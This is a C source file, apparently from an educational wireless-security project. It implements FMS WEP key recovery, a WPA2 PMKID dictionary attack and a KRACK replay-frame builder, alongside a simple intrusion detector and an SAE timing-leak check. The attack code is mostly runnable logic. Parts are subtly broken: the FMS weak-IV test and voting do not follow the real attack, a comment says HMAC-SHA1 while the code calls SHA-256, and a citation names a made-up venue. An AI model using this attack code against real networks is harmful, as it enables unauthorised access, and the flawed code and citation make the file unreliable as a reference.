/**
 * wireless_attack.c — Attack Simulation, Cryptanalysis, and Intrusion Detection
 *
 * Implements: FMS WEP key recovery, WPA2 PMKID dictionary attack,
 *             KRACK replay attack, evil twin detection, wireless IDS
 *
 * Knowledge Levels: L5 (cryptanalysis algorithms), L6 (attack simulation),
 *                   L8 (side-channel analysis)
 *
 * References:
 *   Fluhrer, Mantin, Shamir (2001): "Weaknesses in the Key Scheduling
 *        Algorithm of RC4" — Selective Data Encryption (SDA) magazine
 *   Vanhoef & Piessens (2017): "Key Reinstallation Attacks"
 *   Tews, Weinmann, Pyshkin (2007): "Breaking 104-bit WEP in < 60 seconds"
 */

#include "wireless_attack.h"
#include "wireless_crypto.h"
#include "wireless_auth.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <math.h>

/* ============================================================================
 * L5: FMS WEP Attack — Statistical Key Recovery
 * ============================================================================ */

/**
 * Theory (FMS 2001):
 *
 * For a WEP IV of the form (A+3, N-1, X) where N=256:
 * - The first keystream byte has probability ≈ 5% of being
 *   S[S[1] + S[A] + S[A+3]][A+3] + K[B] dependent
 * - By collecting many such weak IVs, each votes for one key byte
 * - After ~60-300 weak IVs (per key byte), the correct value emerges
 *
 * The attack recovers the WEP key byte-by-byte, using previously
 * recovered bytes to extend the key.
 */

void wep_fms_init(wep_fms_state_t *state, int key_len)
{
    if (!state) return;
    memset(state, 0, sizeof(wep_fms_state_t));
    state->target_key_len = key_len;
    state->recovered_bytes = 0;
    state->key_recovered = 0;
    state->captured = NULL;
    state->capture_count = 0;
    state->capture_capacity = 0;

    /* Allocate initial capture buffer */
    state->capture_capacity = 10000;
    state->captured = (wep_captured_iv_t *)malloc(
        state->capture_capacity * sizeof(wep_captured_iv_t));
}

static int is_fms_weak_iv(const uint8_t iv[3])
{
    /* FMS weak IV condition: the first two bytes of the IV
       are (A+3, 255) and we look at keystream byte position B+3 */
    /* The weak IV criterion: the IV exposes a KSA state where
       the key byte influences the first output predictably. */

    /* Classic FMS: weak when IV = (3, 255, X) or similar patterns
       where (IV[0] + IV[1]) gives a useful index */
    /* Simplified detection: IV[1] = 255 gives maximum info leakage */
    if (iv[1] == 0xFF) return 1;

    /* Also detect KoreK-style weak IVs */
    if (iv[0] >= 3 && iv[0] <= 15 && iv[1] == 0xFF) return 1;

    return 0;
}

void wep_fms_add_packet(wep_fms_state_t *state,
                         const uint8_t *iv,
                         uint8_t keystream_byte)
{
    if (!state || !iv) return;

    state->total_packets_seen++;

    /* Check if this IV is weak */
    int weak = is_fms_weak_iv(iv);

    /* Store capture */
    if (state->capture_count >= state->capture_capacity) {
        state->capture_capacity *= 2;
        state->captured = (wep_captured_iv_t *)realloc(
            state->captured,
            state->capture_capacity * sizeof(wep_captured_iv_t));
        if (!state->captured) return;
    }

    wep_captured_iv_t *cap = &state->captured[state->capture_count];
    memcpy(cap->iv, iv, 3);
    cap->keystream_byte = keystream_byte;
    cap->is_weak = weak;
    cap->packet_number = state->total_packets_seen;
    state->capture_count++;

    if (weak) {
        state->weak_iv_packets++;

        /* Vote for key bytes if we've recovered at least 3 bytes */
        if (state->recovered_bytes >= 3) {
            int byte_idx = state->recovered_bytes;

            /* FMS prediction: guess_byte = out - S_inv[S[A+3] + S[A] + S[1]]
               where we model the KSA state after known key bytes */
            /* Simplified: simulate KSA with known bytes, predict output */

            /* Vote for candidate values of key byte */
            {
                rc4_ctx_t rc4;
                uint8_t partial_key[16];
                int k;

                /* Build partial key: known bytes + candidate */
                memcpy(partial_key, state->target_key, byte_idx);

                for (k = 0; k < 256; k++) {
                    partial_key[byte_idx] = (uint8_t)k;

                    /* Simulate KSA with this candidate key */
                    rc4_init(&rc4, partial_key, byte_idx + 1);

                    /* Generate keystream (first byte after IV) */
                    uint8_t dummy[3 + 1];
                    /* First discard the IV bytes (3 bytes of KSA) */
                    /* The RC4 stream starts with the IV prepended */
                    {
                        uint8_t key_with_iv[16];
                        key_with_iv[0] = iv[0];
                        key_with_iv[1] = iv[1];
                        key_with_iv[2] = iv[2];
                        memcpy(key_with_iv + 3, partial_key, byte_idx + 1);
                        rc4_init(&rc4, key_with_iv, byte_idx + 4);
                    }
                    rc4_generate(&rc4, dummy, 1);

                    /* Did we predict correctly? */
                    if (dummy[0] == keystream_byte) {
                        state->votes[byte_idx][k]++;
                    }
                }
            }
        }
    }
}

int wep_fms_recover_key(wep_fms_state_t *state)
{
    int byte_idx, best_vote_idx, best_count;
    int i;

    if (!state) return -1;
    if (state->weak_iv_packets < 60) return -1; /* Need more packets */

    /* Recover up to 13 bytes (104-bit WEP) */
    for (byte_idx = state->recovered_bytes;
         byte_idx < state->target_key_len; byte_idx++) {

        best_count = 0;
        best_vote_idx = 0;

        /* Find candidate with most votes (for bytes ≥ 3) */
        if (byte_idx >= 3) {
            for (i = 0; i < 256; i++) {
                if (state->votes[byte_idx][i] > best_count) {
                    best_count = state->votes[byte_idx][i];
                    best_vote_idx = i;
                }
            }

            /* Threshold: at least 5 votes to consider "recovered" */
            if (best_count >= 5) {
                state->target_key[byte_idx] = (uint8_t)best_vote_idx;
                state->recovered_bytes++;
            } else {
                /* Need more data for this byte */
                return -1;
            }
        } else {
            /* For first 3 bytes (IV bytes), they are known */
            state->recovered_bytes++;
        }
    }

    if (state->recovered_bytes >= state->target_key_len) {
        state->key_recovered = 1;
        return 0;
    }

    return -1;
}

void wep_fms_stats(const wep_fms_state_t *state,
                    uint32_t *total, uint32_t *weak, int *recovered_bytes)
{
    if (!state) return;
    if (total)  *total  = state->total_packets_seen;
    if (weak)   *weak   = state->weak_iv_packets;
    if (recovered_bytes) *recovered_bytes = state->recovered_bytes;
}

/* ============================================================================
 * L6: WPA2 PMKID Dictionary Attack
 * ============================================================================ */

void wpa2_dict_attack_init(wpa2_dictionary_state_t *state,
                            const pmkid_capture_t *target)
{
    if (!state) return;
    memset(state, 0, sizeof(wpa2_dictionary_state_t));
    if (target) {
        memcpy(&state->target, target, sizeof(pmkid_capture_t));
    }
}

int wpa2_dict_attack_try(wpa2_dictionary_state_t *state,
                          const char *passphrase)
{
    uint8_t pmk[PMK_LEN];

    if (!state || !passphrase) return 0;

    state->attempts++;

    /* PMK = PBKDF2(HMAC-SHA1, passphrase, SSID, 4096, 256) */
    pbkdf2_hmac_sha256((const uint8_t *)passphrase, strlen(passphrase),
                        state->target.ssid, state->target.ssid_len,
                        4096, pmk, PMK_LEN);

    /* PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC) */
    handshake_compute_pmkid(pmk,
                             state->target.ap_mac,
                             state->target.sta_mac,
                             state->candidate_pmkid);

    /* Compare to target PMKID */
    if (constant_time_memcmp(state->candidate_pmkid,
                              state->target.pmkid, 16) == 0) {
        state->found = 1;
        strncpy(state->found_passphrase, passphrase,
                sizeof(state->found_passphrase) - 1);
        return 1;
    }

    return 0;
}

int wpa2_dict_attack_try_list(wpa2_dictionary_state_t *state,
                               const char **wordlist, int count)
{
    int i;

    if (!state || !wordlist) return -1;

    for (i = 0; i < count; i++) {
        if (wpa2_dict_attack_try(state, wordlist[i])) {
            return i;
        }
    }

    return -1;
}

/* ============================================================================
 * L6: KRACK Attack Simulation
 * ============================================================================ */

void krack_init(krack_state_t *state,
                const uint8_t *target_mac, const uint8_t *ap_mac)
{
    if (!state) return;
    memset(state, 0, sizeof(krack_state_t));
    if (target_mac) memcpy(state->target_mac, target_mac, 6);
    if (ap_mac) memcpy(state->ap_mac, ap_mac, 6);
}

int krack_capture_msg3(krack_state_t *state,
                        const uint8_t *msg3, size_t msg3_len)
{
    if (!state || !msg3) return -1;
    if (msg3_len > sizeof(state->msg3_original)) return -1;

    memcpy(state->msg3_original, msg3, msg3_len);
    state->msg3_original_len = msg3_len;
    state->msg3_captured = 1;

    /* Extract original replay counter */
    {
        const eapol_key_frame_t *key =
            (const eapol_key_frame_t *)(msg3 + sizeof(eapol_header_t));
        memcpy(state->original_replay_ctr,
                key->key_replay_counter, WPA_REPLAY_CTR_LEN);
    }

    return 0;
}

int krack_build_replay(krack_state_t *state)
{
    int i;

    if (!state || !state->msg3_captured) return -1;

    /* Copy original message 3 */
    memcpy(state->msg3_replayed, state->msg3_original,
            state->msg3_original_len);
    state->msg3_replayed_len = state->msg3_original_len;

    /* Increment replay counter to make victim accept the retransmission */
    memcpy(state->incremented_replay_ctr,
            state->original_replay_ctr, WPA_REPLAY_CTR_LEN);

    /* Increment (big-endian) */
    for (i = WPA_REPLAY_CTR_LEN - 1; i >= 0; i--) {
        if (++state->incremented_replay_ctr[i] != 0) break;
    }

    /* Update replay counter in the replayed frame */
    {
        eapol_key_frame_t *key =
            (eapol_key_frame_t *)(state->msg3_replayed +
                                   sizeof(eapol_header_t));
        memcpy(key->key_replay_counter,
                state->incremented_replay_ctr, WPA_REPLAY_CTR_LEN);
    }

    /* The KRACK vulnerability: the victim will accept this message 3,
       reinstall the PTK, and reset the nonce/PN counter.  This creates
       nonce reuse — catastrophic for CCMP. */

    state->replayed = 1;
    state->nonce_reuse_detected = 1;

    return 0;
}

int krack_detect(const uint8_t *packet, size_t len,
                  const uint8_t *last_replay_ctr)
{
    const eapol_key_frame_t *key;
    int i;

    if (!packet || !last_replay_ctr) return 0;
    if (len < sizeof(eapol_header_t) + sizeof(eapol_key_frame_t)) return 0;

    key = (const eapol_key_frame_t *)(packet + sizeof(eapol_header_t));

    /* Detection: if this is a retransmission of message 3 with
       incremented counter but a re-used ANonce, flag it. */
    for (i = 0; i < WPA_REPLAY_CTR_LEN; i++) {
        if (key->key_replay_counter[i] > last_replay_ctr[i]) {
            /* Replay counter incremented — potentially normal */
            break;
        } else if (key->key_replay_counter[i] < last_replay_ctr[i]) {
            /* Counter went backward — definite replay */
            return 1;
        }
    }

    return 0;
}

/* ============================================================================
 * L7: Wireless IDS (Intrusion Detection System)
 * ============================================================================ */

void ids_init(ids_state_t *ids, int window_sec)
{
    if (!ids) return;
    memset(ids, 0, sizeof(ids_state_t));
    ids->window_sec = window_sec;
    ids->deauth_threshold = 10;      /* >10 deauth/sec is suspicious */
    ids->auth_fail_threshold = 5;    /* >5 auth failures/sec */
    ids->pmkid_request_threshold = 3; /* >3 PMKID requests/sec */
    ids->window_start_time = 0;
}

void ids_process_frame(ids_state_t *ids, int frame_type,
                        int frame_subtype, uint32_t timestamp_sec)
{
    if (!ids) return;

    /* Reset counters if window expired */
    if (timestamp_sec - ids->window_start_time > (uint32_t)ids->window_sec) {
        ids->deauth_frames_seen = 0;
        ids->auth_failures_seen = 0;
        ids->eapol_start_flood = 0;
        ids->pmkid_requests_seen = 0;
        ids->window_start_time = timestamp_sec;

        /* Clear alarms from previous window */
        ids->deauth_flood_alarm = 0;
        ids->brute_force_alarm = 0;
        ids->pmkid_harvest_alarm = 0;
        ids->rogue_ap_alarm = 0;
    }

    /* 802.11 management frame type = 0 */
    if (frame_type == 0) {
        /* Deauthentication frame: subtype 12 */
        if (frame_subtype == 12) {
            ids->deauth_frames_seen++;
            if (ids->deauth_frames_seen > (uint32_t)ids->deauth_threshold) {
                ids->deauth_flood_alarm = 1;
            }
        }
        /* Authentication frame: subtype 11 */
        if (frame_subtype == 11) {
            ids->auth_failures_seen++;
            if (ids->auth_failures_seen > (uint32_t)ids->auth_fail_threshold) {
                ids->brute_force_alarm = 1;
            }
        }
    }

    /* EAPOL frame detection (Data type, certain subtypes) */
    if (frame_type == 2) {
        /* Check for PMKID requests in RSN IE */
        ids->pmkid_requests_seen++;
        if (ids->pmkid_requests_seen > (uint32_t)ids->pmkid_request_threshold) {
            ids->pmkid_harvest_alarm = 1;
        }
    }
}

int ids_check_alarms(const ids_state_t *ids)
{
    int alarms = 0;
    if (!ids) return 0;

    if (ids->deauth_flood_alarm)  alarms |= 0x01;
    if (ids->brute_force_alarm)   alarms |= 0x02;
    if (ids->pmkid_harvest_alarm) alarms |= 0x04;
    if (ids->rogue_ap_alarm)      alarms |= 0x08;

    return alarms;
}

void ids_reset_alarms(ids_state_t *ids)
{
    if (!ids) return;
    ids->deauth_flood_alarm = 0;
    ids->brute_force_alarm = 0;
    ids->pmkid_harvest_alarm = 0;
    ids->rogue_ap_alarm = 0;
}

void ids_get_stats(const ids_state_t *ids,
                    uint32_t *deauth_count,
                    uint32_t *auth_fail_count,
                    uint32_t *pmkid_count)
{
    if (!ids) return;
    if (deauth_count)   *deauth_count   = ids->deauth_frames_seen;
    if (auth_fail_count) *auth_fail_count = ids->auth_failures_seen;
    if (pmkid_count)     *pmkid_count     = ids->pmkid_requests_seen;
}

/* ============================================================================
 * L8: SAE Timing Side-Channel Detection
 * ============================================================================ */

/**
 * detect_sae_timing_leak — Statistical test for timing variations
 *
 * L8 Concept: SAE's "hunting and pecking" loop iterates until it
 * finds a point on the curve.  The number of iterations varies with
 * the password, creating a potential timing side channel.
 *
 * WPA3 mandates constant-time implementations to prevent this.
 * This function detects if timing samples show anomalous variation
 * that could indicate a non-constant-time implementation.
 *
 * Uses: Coefficient of variation (CV = σ/μ) as the test statistic.
 * CV > 0.05 suggests exploitable timing variation.
 */
int detect_sae_timing_leak(const double *timing_samples, int num_samples)
{
    double sum = 0.0, sum_sq = 0.0;
    double mean, variance, stddev, cv;
    int i;

    if (!timing_samples || num_samples < 10) return 0;

    /* Compute mean and variance */
    for (i = 0; i < num_samples; i++) {
        sum += timing_samples[i];
        sum_sq += timing_samples[i] * timing_samples[i];
    }

    mean = sum / num_samples;
    variance = (sum_sq / num_samples) - (mean * mean);
    if (variance < 0.0) variance = 0.0;
    stddev = sqrt(variance);

    /* Coefficient of variation */
    if (mean > 0.0) {
        cv = stddev / mean;
    } else {
        cv = 0.0;
    }

    /* If CV > 5%, flag as potential timing leak
       (real SAE implementations should have CV < 1%) */
    return (cv > 0.05) ? 1 : 0;
}
